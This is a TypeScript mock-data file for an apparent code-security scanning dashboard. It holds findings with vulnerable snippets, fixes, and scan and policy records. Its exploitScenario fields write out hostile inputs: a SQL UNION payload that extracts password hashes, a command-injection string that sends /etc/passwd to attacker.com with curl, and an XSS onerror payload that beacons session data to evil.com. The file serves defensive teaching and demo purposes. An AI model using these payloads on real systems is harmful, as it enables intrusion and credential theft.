import { SecurityFinding, ScanRecord, ProjectRepo, SecurityActivity, SecurityPolicy } from '../types/security';

export const INITIAL_FINDINGS: SecurityFinding[] = [
  {
    id: "SHP-INJ-001-F38C",
    ruleId: "INJ-001",
    name: "SQL Injection via String Interpolation",
    type: "SQL Injection",
    severity: "CRITICAL",
    file: "backend/api/user_controller.py",
    line: 42,
    cwe: "CWE-89",
    cweName: "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
    cvss: 9.8,
    description: "Dynamic SQL query formed via python f-string without parameterized query bindings.",
    whyDangerous: "Direct interpolation of untrusted HTTP query parameters into database query strings breaks query structure. An attacker can append arbitrary SQL operators, alter WHERE logic, bypass access controls, or exfiltrate all tenant database tables via UNION SELECT payloads.",
    impact: "Full confidentiality and integrity loss. Attackers can execute arbitrary SQL commands, dump entire databases, modify user permissions, or execute administrative stored procedures.",
    remediation: "Use parameterized queries or ORM placeholders. Pass input parameters as an argument tuple to cursor.execute() instead of string formatting.",
    evidence: 'cursor.execute(f"SELECT id, username, email, role FROM users WHERE id = {user_id}")',
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "python",
    snippet: {
      startLine: 39,
      endLine: 45,
      targetLine: 42,
      lines: [
        { line: 39, code: "def get_user_profile(user_id: str, db_conn):" },
        { line: 40, code: "    cursor = db_conn.cursor()" },
        { line: 41, code: "    # Query user account metadata" },
        { line: 42, code: '    cursor.execute(f"SELECT id, username, email, role FROM users WHERE id = {user_id}")', isTarget: true },
        { line: 43, code: "    record = cursor.fetchone()" },
        { line: 44, code: "    if not record:" },
        { line: 45, code: "        raise HTTPException(status_code=404, detail='User not found')" }
      ]
    },
    remediationPatch: {
      analysis: "The function dynamically formats user_id into the SQL query text using an f-string. Because user_id originates from an external HTTP request, any malicious payload is executed by the SQL engine.",
      exploitScenario: "GET /api/v1/users?id=1%20OR%201=1--%20\nPayload extracts administrative credentials: 1 UNION SELECT 1, username, password_hash, 4 FROM admin_users--",
      whatChanged: "Replaced the vulnerable f-string with a parameterized query: '... WHERE id = %s', (user_id,). The database driver now passes user_id separately as a literal data parameter, preventing interpretation as SQL commands.",
      originalCode: '    cursor.execute(f"SELECT id, username, email, role FROM users WHERE id = {user_id}")',
      patchedCode: '    cursor.execute("SELECT id, username, email, role FROM users WHERE id = %s", (user_id,))',
      diffHunk: `@@ -41,3 +41,3 @@
     # Query user account metadata
-    cursor.execute(f"SELECT id, username, email, role FROM users WHERE id = {user_id}")
+    cursor.execute("SELECT id, username, email, role FROM users WHERE id = %s", (user_id,))
     record = cursor.fetchone()`
    }
  },
  {
    id: "SHP-SEC-001-A91B",
    ruleId: "SEC-001",
    name: "Hardcoded AWS Access Key ID",
    type: "Hardcoded Secret",
    severity: "CRITICAL",
    file: "backend/auth/aws_client.py",
    line: 14,
    cwe: "CWE-798",
    cweName: "Use of Hard-coded Credentials",
    cvss: 9.1,
    description: "Exposed AWS production access key found committed in source code.",
    whyDangerous: "Hardcoded credentials committed to version control are immediately accessible to anyone with repository access, clones, or CI logs. Automated credential scrapers frequently compromise exposed AWS keys within minutes of pushing.",
    impact: "Full compromise of AWS IAM role. An attacker can authenticate as this principal to query S3 buckets, alter security groups, spin up crypto-mining EC2 instances, or delete databases.",
    remediation: "Immediately deactivate and delete this key in AWS IAM. Transition to IAM instance roles, AWS Secrets Manager, or read credentials from os.environ.get('AWS_ACCESS_KEY_ID').",
    evidence: 'AWS_ACCESS_KEY_ID = "AKIA5T7V9EXAMPLE8391"',
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "python",
    snippet: {
      startLine: 11,
      endLine: 17,
      targetLine: 14,
      lines: [
        { line: 11, code: "import boto3" },
        { line: 12, code: "import os" },
        { line: 13, code: "" },
        { line: 14, code: 'AWS_ACCESS_KEY_ID = "AKIA5T7V9EXAMPLE8391"', isTarget: true },
        { line: 15, code: 'AWS_REGION = "us-east-1"' },
        { line: 16, code: "" },
        { line: 17, code: "s3_client = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY_ID)" }
      ]
    },
    remediationPatch: {
      analysis: "AWS Access Key string 'AKIA5T7V9EXAMPLE8391' is defined as a static module-level constant.",
      exploitScenario: "An attacker clones the repo or views git commit log, runs: aws s3 ls --profile exposed_key, exfiltrating customer backups.",
      whatChanged: "Removed the plaintext string constant. Retrieved the credential dynamically from environment variable with fallback error checking.",
      originalCode: 'AWS_ACCESS_KEY_ID = "AKIA5T7V9EXAMPLE8391"',
      patchedCode: 'AWS_ACCESS_KEY_ID = os.environ.get("AWS_ACCESS_KEY_ID")\nif not AWS_ACCESS_KEY_ID:\n    raise RuntimeError("AWS_ACCESS_KEY_ID environment variable is missing")',
      diffHunk: `@@ -13,3 +13,5 @@
 
-AWS_ACCESS_KEY_ID = "AKIA5T7V9EXAMPLE8391"
+AWS_ACCESS_KEY_ID = os.environ.get("AWS_ACCESS_KEY_ID")
+if not AWS_ACCESS_KEY_ID:
+    raise RuntimeError("AWS_ACCESS_KEY_ID environment variable is missing")
 AWS_REGION = "us-east-1"`
    }
  },
  {
    id: "SHP-INJ-003-87D2",
    ruleId: "INJ-003",
    name: "Command Injection via subprocess shell=True",
    type: "Command Injection",
    severity: "CRITICAL",
    file: "backend/utils/diagnostics_runner.py",
    line: 28,
    cwe: "CWE-78",
    cweName: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
    cvss: 9.8,
    description: "Invoking system shell with shell=True and untrusted host string argument.",
    whyDangerous: "When shell=True is passed to subprocess, Python passes the entire command line through the platform's shell interpreter (/bin/sh on Linux, cmd.exe on Windows). Any shell metacharacters like semicolons, pipes, or command substitutions are executed with the permissions of the application process.",
    impact: "Remote Code Execution (RCE) on the server. Attacker can establish reverse shells, read environment variables, modify local files, and move laterally across private VPC subnets.",
    remediation: "Set shell=False and pass arguments as an explicit array of strings: subprocess.run(['ping', '-c', '1', host], check=True).",
    evidence: 'subprocess.run(f"ping -c 1 {target_host}", shell=True, capture_output=True)',
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "python",
    snippet: {
      startLine: 25,
      endLine: 31,
      targetLine: 28,
      lines: [
        { line: 25, code: "def run_network_diagnostic(target_host: str) -> dict:" },
        { line: 26, code: "    # Run ICMP connectivity check" },
        { line: 27, code: "    try:" },
        { line: 28, code: '        proc = subprocess.run(f"ping -c 1 {target_host}", shell=True, capture_output=True)', isTarget: true },
        { line: 29, code: "        return {'success': proc.returncode == 0, 'output': proc.stdout.decode()}" },
        { line: 30, code: "    except Exception as exc:" },
        { line: 31, code: "        return {'success': False, 'error': str(exc)}" }
      ]
    },
    remediationPatch: {
      analysis: "The command string is formatted using an f-string and executed in a shell interpreter. Input passed to target_host can break out of the ping command.",
      exploitScenario: "target_host = '8.8.8.8; cat /etc/passwd | curl -X POST -d @- https://attacker.com/leak #'\nShell executes ping, then executes cat /etc/passwd.",
      whatChanged: "Switched from a shell-interpolated command string to an argument list without a shell interpreter (shell=False). The OS executes ping directly and treats target_host strictly as an IP/hostname argument.",
      originalCode: '        proc = subprocess.run(f"ping -c 1 {target_host}", shell=True, capture_output=True)',
      patchedCode: '        proc = subprocess.run(["ping", "-c", "1", target_host], shell=False, capture_output=True, check=False)',
      diffHunk: `@@ -27,3 +27,3 @@
     try:
-        proc = subprocess.run(f"ping -c 1 {target_host}", shell=True, capture_output=True)
+        proc = subprocess.run(["ping", "-c", "1", target_host], shell=False, capture_output=True, check=False)
         return {'success': proc.returncode == 0, 'output': proc.stdout.decode()}`
    }
  },
  {
    id: "SHP-DOM-001-44E9",
    ruleId: "DOM-001",
    name: "Cross-Site Scripting via dangerouslySetInnerHTML",
    type: "DOM Manipulation (XSS)",
    severity: "HIGH",
    file: "frontend/src/components/UserProfileCard.tsx",
    line: 37,
    cwe: "CWE-79",
    cweName: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
    cvss: 7.5,
    description: "Unsanitized user bio markdown rendered directly into React DOM via dangerouslySetInnerHTML.",
    whyDangerous: "Injecting unescaped HTML into the DOM bypasses React's built-in XSS protections. If an attacker submits a biography containing JavaScript execution vectors (e.g. SVG onload or img onerror), the script executes in the victim's session.",
    impact: "Client-side code execution in victim browsers. Can steal session tokens, make unauthorized API requests on behalf of the user, or inject malicious phishing forms.",
    remediation: "Sanitize all dynamic HTML using DOMPurify before passing to __html, or render safe plaintext elements.",
    evidence: '<div className="bio-content" dangerouslySetInnerHTML={{ __html: user.biographyHtml }} />',
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "typescript",
    snippet: {
      startLine: 34,
      endLine: 40,
      targetLine: 37,
      lines: [
        { line: 34, code: "export const UserProfileCard = ({ user }: { user: UserProfile }) => {" },
        { line: 35, code: "  return (" },
        { line: 36, code: "    <div className='p-4 rounded-lg bg-surface'>" },
        { line: 37, code: '      <div className="bio-content" dangerouslySetInnerHTML={{ __html: user.biographyHtml }} />', isTarget: true },
        { line: 38, code: "      <span className='text-xs text-muted'>{user.joinedDate}</span>" },
        { line: 39, code: "    </div>" },
        { line: 40, code: "  );" }
      ]
    },
    remediationPatch: {
      analysis: "user.biographyHtml is passed raw to dangerouslySetInnerHTML. Any malicious script tag or event handler inside will execute in the client's browser.",
      exploitScenario: 'user.biographyHtml = `<p>Bio</p><img src=invalid onerror="fetch(\'/api/v1/session\').then(r=>r.json()).then(d=>navigator.sendBeacon(\'https://evil.com\', JSON.stringify(d)))">`',
      whatChanged: "Imported and applied DOMPurify.sanitize() to filter out unsafe tags, scripts, and attributes while allowing harmless formatting elements like bold and italics.",
      originalCode: '      <div className="bio-content" dangerouslySetInnerHTML={{ __html: user.biographyHtml }} />',
      patchedCode: '      <div className="bio-content" dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.biographyHtml) }} />',
      diffHunk: `@@ -36,3 +36,3 @@
     <div className='p-4 rounded-lg bg-surface'>
-      <div className="bio-content" dangerouslySetInnerHTML={{ __html: user.biographyHtml }} />
+      <div className="bio-content" dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.biographyHtml) }} />
       <span className='text-xs text-muted'>{user.joinedDate}</span>`
    }
  },
  {
    id: "SHP-AUTH-001-19B4",
    ruleId: "AUTH-001",
    name: "Unprotected Sensitive API Route",
    type: "Missing Authentication",
    severity: "HIGH",
    file: "backend/routes/admin_endpoints.py",
    line: 19,
    cwe: "CWE-306",
    cweName: "Missing Authentication for Critical Function",
    cvss: 8.2,
    description: "Administrative cache-invalidation and user-purge endpoint declared without authentication dependencies.",
    whyDangerous: "State-changing or administrative actions that lack authentication decorators or middleware can be reached by any unauthenticated internet client.",
    impact: "Unauthorized actors can clear system caches, disrupt service availability, or trigger bulk database re-indexing.",
    remediation: "Add an authentication guard dependency: dependencies=[Depends(require_admin_user)].",
    evidence: '@router.post("/api/admin/purge-cache")',
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "python",
    snippet: {
      startLine: 16,
      endLine: 22,
      targetLine: 19,
      lines: [
        { line: 16, code: "from fastapi import APIRouter" },
        { line: 17, code: "router = APIRouter(tags=['admin'])" },
        { line: 18, code: "" },
        { line: 19, code: '@router.post("/api/admin/purge-cache")', isTarget: true },
        { line: 20, code: "async def purge_cache_endpoint():" },
        { line: 21, code: "    redis_client.flushdb()" },
        { line: 22, code: "    return {'status': 'purged', 'timestamp': time.time()}" }
      ]
    },
    remediationPatch: {
      analysis: "The POST route '/api/admin/purge-cache' is defined without any security dependency in its router decorator.",
      exploitScenario: "curl -X POST https://production-api.acme.corp/api/admin/purge-cache\nCauses sudden cache misses and database CPU spikes without requiring login credentials.",
      whatChanged: "Added Depends(require_admin_privileges) dependency into the route decorator to enforce Bearer token validation and admin role verification.",
      originalCode: '@router.post("/api/admin/purge-cache")',
      patchedCode: '@router.post("/api/admin/purge-cache", dependencies=[Depends(require_admin_privileges)])',
      diffHunk: `@@ -18,3 +18,3 @@
 
-@router.post("/api/admin/purge-cache")
+@router.post("/api/admin/purge-cache", dependencies=[Depends(require_admin_privileges)])
 async def purge_cache_endpoint():`
    }
  },
  {
    id: "SHP-DEP-CVE2023-49083",
    ruleId: "CVE-2023-49083",
    name: "Known Vulnerability in Cryptography (CVE-2023-49083)",
    type: "Vulnerable Dependency",
    severity: "HIGH",
    file: "backend/requirements.txt",
    line: 8,
    cwe: "CWE-400",
    cweName: "Uncontrolled Resource Consumption ('Resource Exhaustion')",
    cvss: 7.5,
    description: "Outdated cryptography package version 41.0.2 is vulnerable to NULL pointer dereference.",
    whyDangerous: "Calling load_pem_pkcs7_certificates or load_der_pkcs7_certificates with invalid input causes a NULL pointer dereference leading to process termination and Denial of Service.",
    impact: "Remote denial of service against TLS handshake or cryptographic verification workers.",
    remediation: "Upgrade cryptography to version 42.0.0 or higher in requirements.txt.",
    evidence: "cryptography==41.0.2",
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "manifest",
    snippet: {
      startLine: 6,
      endLine: 11,
      targetLine: 8,
      lines: [
        { line: 6, code: "fastapi==0.110.0" },
        { line: 7, code: "boto3==1.34.20" },
        { line: 8, code: "cryptography==41.0.2", isTarget: true },
        { line: 9, code: "pydantic==2.6.4" },
        { line: 10, code: "uvicorn==0.28.0" },
        { line: 11, code: "psycopg2-binary==2.9.9" }
      ]
    },
    remediationPatch: {
      analysis: "cryptography==41.0.2 contains known vulnerability CVE-2023-49083 fixed in 42.0.0.",
      exploitScenario: "Submitting a malformed PKCS7 certificate payload to any verification endpoint crashes the worker process.",
      whatChanged: "Bumped pinned version from 41.0.2 to 42.0.0 in requirements.txt.",
      originalCode: "cryptography==41.0.2",
      patchedCode: "cryptography==42.0.0",
      diffHunk: `@@ -7,3 +7,3 @@
 boto3==1.34.20
-cryptography==41.0.2
+cryptography==42.0.0
 pydantic==2.6.4`
    }
  },
  {
    id: "SHP-DEP-CVE2024-39338",
    ruleId: "CVE-2024-39338",
    name: "Server-Side Request Forgery in Axios (CVE-2024-39338)",
    type: "Vulnerable Dependency",
    severity: "HIGH",
    file: "frontend/package.json",
    line: 19,
    cwe: "CWE-918",
    cweName: "Server-Side Request Forgery (SSRF)",
    cvss: 7.2,
    description: "Axios versions < 1.7.4 allow SSRF bypass via unexpected URL parsing behavior.",
    whyDangerous: "An attacker who controls target request URLs can bypass domain allowlist validations by injecting control characters or relative path schemas.",
    impact: "Internal microservices and cloud instance metadata (169.254.169.254) can be accessed by external requests.",
    remediation: "Upgrade axios to 1.7.7 or later in package.json.",
    evidence: '"axios": "^1.6.2"',
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "manifest",
    snippet: {
      startLine: 16,
      endLine: 22,
      targetLine: 19,
      lines: [
        { line: 16, code: '  "dependencies": {' },
        { line: 17, code: '    "react": "^18.2.0",' },
        { line: 18, code: '    "react-dom": "^18.2.0",' },
        { line: 19, code: '    "axios": "^1.6.2",', isTarget: true },
        { line: 20, code: '    "lucide-react": "^0.359.0",' },
        { line: 21, code: '    "clsx": "^2.1.0"' },
        { line: 22, code: '  },' }
      ]
    },
    remediationPatch: {
      analysis: "axios@1.6.2 is vulnerable to CVE-2024-39338.",
      exploitScenario: "Exploiting protocol relative URL parsing to bounce HTTP requests to AWS instance metadata credentials.",
      whatChanged: "Updated dependency version requirement from ^1.6.2 to ^1.7.7 in package.json.",
      originalCode: '    "axios": "^1.6.2",',
      patchedCode: '    "axios": "^1.7.7",',
      diffHunk: `@@ -18,3 +18,3 @@
     "react-dom": "^18.2.0",
-    "axios": "^1.6.2",
+    "axios": "^1.7.7",
     "lucide-react": "^0.359.0",`
    }
  },
  {
    id: "SHP-AUTH-003-9B02",
    ruleId: "AUTH-003",
    name: "Insecure CORS Policy with Wildcard & Credentials",
    type: "Insecure CORS Policy",
    severity: "MEDIUM",
    file: "backend/config/cors_middleware.py",
    line: 12,
    cwe: "CWE-942",
    cweName: "Permissive Cross-origin Resource Sharing Policy with Credential",
    cvss: 6.5,
    description: "CORS configuration allows wildcard origins '*' while setting allow_credentials=True.",
    whyDangerous: "Browsers reject wildcard origins with credentials, but misconfigured proxies or custom handlers may reflect arbitrary origin headers, allowing attacker web applications to access authenticated session cookies.",
    impact: "Cross-domain session compromise and cross-origin reading of authenticated REST responses.",
    remediation: "Specify explicit trusted origins in allow_origins instead of '*'.",
    evidence: 'allow_origins=["*"], allow_credentials=True',
    status: "OPEN",
    detectedAt: "2026-11-20T19:42:15Z",
    language: "python",
    snippet: {
      startLine: 9,
      endLine: 15,
      targetLine: 12,
      lines: [
        { line: 9, code: "app.add_middleware(" },
        { line: 10, code: "    CORSMiddleware," },
        { line: 11, code: "    allow_origins=['*']," },
        { line: 12, code: "    allow_credentials=True,", isTarget: true },
        { line: 13, code: "    allow_methods=['*']," },
        { line: 14, code: "    allow_headers=['*']," },
        { line: 15, code: ")" }
      ]
    },
    remediationPatch: {
      analysis: "Wildcard origin '*' used alongside allow_credentials=True.",
      exploitScenario: "Victim visits attacker domain which sends XHR to target API, receiving session data if reflection is enabled.",
      whatChanged: "Replaced wildcard with environment-configured trusted domains list.",
      originalCode: "    allow_origins=['*'],",
      patchedCode: "    allow_origins=['https://app.acme.corp', 'https://staging.acme.corp'],",
      diffHunk: `@@ -10,3 +10,3 @@
     CORSMiddleware,
-    allow_origins=['*'],
+    allow_origins=['https://app.acme.corp', 'https://staging.acme.corp'],
     allow_credentials=True,`
    }
  }
];

export const MOCK_PROJECTS: ProjectRepo[] = [
  {
    id: "repo-api-service",
    name: "api-service",
    owner: "ShipSafe-Core",
    language: "Python",
    lastScanned: "12 minutes ago",
    status: "BLOCKED",
    totalFindings: 6,
    criticalCount: 3,
    highCount: 2,
    branch: "main",
    stars: 34,
    isDefault: true
  },
  {
    id: "repo-web-frontend",
    name: "web-frontend",
    owner: "ShipSafe-Core",
    language: "TypeScript",
    lastScanned: "42 minutes ago",
    status: "AT_RISK",
    totalFindings: 2,
    criticalCount: 0,
    highCount: 2,
    branch: "main",
    stars: 58
  },
  {
    id: "repo-auth-gateway",
    name: "auth-gateway",
    owner: "ShipSafe-Core",
    language: "Python",
    lastScanned: "3 hours ago",
    status: "SAFE",
    totalFindings: 0,
    criticalCount: 0,
    highCount: 0,
    branch: "feature/oauth2-pkce",
    stars: 19
  },
  {
    id: "repo-data-pipeline",
    name: "data-pipeline",
    owner: "ShipSafe-Core",
    language: "Python",
    lastScanned: "Yesterday",
    status: "SAFE",
    totalFindings: 0,
    criticalCount: 0,
    highCount: 0,
    branch: "main",
    stars: 12
  }
];

export const MOCK_SCANS: ScanRecord[] = [
  {
    id: "SCAN-2026-089",
    repository: "ShipSafe-Core/api-service",
    branch: "main",
    commit: "8f3b2a1",
    timestamp: "2026-11-20T19:42:15Z",
    status: "FAILED",
    totalFindings: 6,
    critical: 3,
    high: 2,
    medium: 1,
    low: 0,
    resolved: 14,
    policyViolation: "Blocked: 3 CRITICAL vulnerabilities exceed policy threshold (fail-on: high)",
    trigger: "GitHub Action (PR)",
    durationMs: 1420,
    filesScanned: 64
  },
  {
    id: "SCAN-2026-088",
    repository: "ShipSafe-Core/auth-gateway",
    branch: "feature/oauth2-pkce",
    commit: "3c91e04",
    timestamp: "2026-11-20T17:15:00Z",
    status: "PASSED",
    totalFindings: 0,
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
    resolved: 4,
    policyViolation: null,
    trigger: "Pre-commit Hook",
    durationMs: 820,
    filesScanned: 28
  },
  {
    id: "SCAN-2026-087",
    repository: "ShipSafe-Core/web-frontend",
    branch: "main",
    commit: "1a77d29",
    timestamp: "2026-11-20T14:02:40Z",
    status: "WARNING",
    totalFindings: 2,
    critical: 0,
    high: 2,
    medium: 0,
    low: 0,
    resolved: 22,
    policyViolation: "Warning: 2 High severity findings require approval before merging",
    trigger: "CLI Scan",
    durationMs: 2150,
    filesScanned: 112
  },
  {
    id: "SCAN-2026-086",
    repository: "ShipSafe-Core/api-service",
    branch: "hotfix/cors-fix",
    commit: "991e2b4",
    timestamp: "2026-11-19T22:10:00Z",
    status: "FAILED",
    totalFindings: 7,
    critical: 3,
    high: 3,
    medium: 1,
    low: 0,
    resolved: 11,
    policyViolation: "Blocked: Commit violates fail-on: high policy",
    trigger: "GitHub Action (PR)",
    durationMs: 1380,
    filesScanned: 64
  }
];

export const MOCK_ACTIVITIES: SecurityActivity[] = [
  {
    id: "act-1",
    type: "COMMIT_BLOCKED",
    title: "Commit Blocked in CI",
    description: "PR #142 in api-service blocked by ShipSafe Guard due to 3 CRITICAL vulnerabilities.",
    timestamp: "12m ago",
    severity: "CRITICAL",
    repository: "api-service",
    actor: "GitHub Actions Bot"
  },
  {
    id: "act-2",
    type: "VULNERABILITY_FOUND",
    title: "SQL Injection Discovered",
    description: "CWE-89 detected in user_controller.py:42 via string interpolation.",
    timestamp: "12m ago",
    severity: "CRITICAL",
    repository: "api-service",
    actor: "ShipSafe Engine v2.4"
  },
  {
    id: "act-3",
    type: "FIX_APPLIED",
    title: "Vulnerability Remediated",
    description: "JWT Secret Key replaced with AWS Secrets Manager in auth-gateway. Verified clean.",
    timestamp: "3h ago",
    severity: "HIGH",
    repository: "auth-gateway",
    actor: "alex@acme.dev"
  },
  {
    id: "act-4",
    type: "SCAN_COMPLETED",
    title: "Pre-commit Scan Passed",
    description: "Local pre-commit check ran in 820ms. 0 vulnerabilities found.",
    timestamp: "3h ago",
    repository: "auth-gateway",
    actor: "Git Hook"
  }
];

export const DEFAULT_POLICY: SecurityPolicy = {
  failOnSeverity: "HIGH",
  blockPRsOnCritical: true,
  blockPRsOnHigh: true,
  enableSecretEntropy: true,
  entropyThreshold: 4.5,
  enableASTInjections: true,
  enableXSSChecks: true,
  enableAuthChecks: true,
  enableDependencyAudit: true,
  ignoredPaths: [
    "node_modules/**",
    ".git/**",
    "tests/fixtures/**",
    "dist/**",
    "*.min.js"
  ]
};
